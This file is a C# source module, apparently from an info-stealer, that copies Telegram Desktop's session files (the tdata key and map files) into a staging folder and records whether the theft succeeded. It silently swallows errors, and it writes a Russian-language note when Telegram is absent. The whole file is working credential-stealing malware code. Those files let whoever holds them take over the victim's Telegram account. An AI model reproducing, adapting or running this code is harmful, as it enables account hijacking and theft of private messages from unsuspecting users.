using System.IO;

internal class TG
{
	public static void Start()
	{
		try
		{
			string text = $"{Buffer.path_l}Telegram";
			string text2 = $"{Buffer.path_ad}Telegram Desktop\\tdata";
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			if (Directory.Exists(text2))
			{
				if (!Directory.Exists(text + "\\D877F783D5D3EF8C"))
				{
					Directory.CreateDirectory(text + "\\D877F783D5D3EF8C");
				}
				string[] array = new string[4]
				{
					"\\D877F783D5D3EF8C1",
					"\\D877F783D5D3EF8C0",
					"\\D877F783D5D3EF8C\\map1",
					"\\D877F783D5D3EF8C\\map0"
				};
				foreach (string str in array)
				{
					try
					{
						File.Copy(text2 + str, text + str, overwrite: true);
					}
					catch
					{
					}
				}
				Buffer.XBufferData[3] = "1";
				return;
			}
			File.WriteAllText($"{text}\\info.txt", $"{Buffer.head}Telegram не найден на компьютере.");
		}
		catch
		{
		}
		Buffer.XBufferData[3] = "0";
	}
}
